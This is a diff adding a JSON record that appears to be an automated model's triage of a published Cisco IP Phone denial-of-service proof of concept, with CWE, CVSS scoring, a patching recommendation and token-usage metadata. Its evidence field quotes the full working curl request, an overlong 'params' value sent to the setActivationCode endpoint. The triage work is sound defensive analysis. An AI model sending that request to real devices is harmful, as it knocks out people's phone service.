@@ -1,0 +1,65 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "A long activation code parameter sent to the deviceconfig setActivationCode endpoint on Cisco IP Phone (before 11.7(1)) can cause a denial of service. The PoC shows an HTTP(S) request with an overly long 'params' value that crashes or otherwise disrupts the phone.",
+    "affected_product": "Cisco IP Phone, versions before 11.7(1)",
+    "cwe": "CWE-20",
+    "cwe_quote": "curl -v --path-as-is --insecure\nhttps://phone_address/deviceconfig/setActivationCode?params=aaaaaaaaaaaaaaaaaaaaaaaaaaa... (very long string)",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "curl -v --path-as-is --insecure\nhttps://phone_address/deviceconfig/setActivationCode?params=aaaaaaaaaaaaaaaaaaaaaaaaaaa..."
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "N",
+        "quote": ""
+      },
+      "UI": {
+        "value": "N",
+        "quote": ""
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "N",
+        "quote": ""
+      },
+      "I": {
+        "value": "N",
+        "quote": ""
+      },
+      "A": {
+        "value": "H",
+        "quote": "Exploit Title: Cisco IP Phone 11.7 - Denial of Service (PoC)"
+      }
+    },
+    "recommended_next_step": "Review the Cisco advisory and apply vendor-provided patches or mitigations for versions before 11.7(1). If patching is not immediately possible, block or restrict access to the deviceconfig setActivationCode endpoint and implement network-level controls to limit HTTP(S) access to management interfaces.",
+    "confidence": "high",
+    "evidence_quotes": [
+      {
+        "claim": "Exploit title and impact",
+        "quote": "Exploit Title: Cisco IP Phone 11.7 - Denial of Service (PoC)"
+      },
+      {
+        "claim": "Affected version",
+        "quote": "Version: Before 11.7(1)"
+      },
+      {
+        "claim": "PoC request showing long parameter",
+        "quote": "curl -v --path-as-is --insecure\nhttps://phone_address/deviceconfig/setActivationCode?params=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 2107,
+    "output_tokens": 749,
+    "latency_s": null,
+    "batch": true
+  }
+}
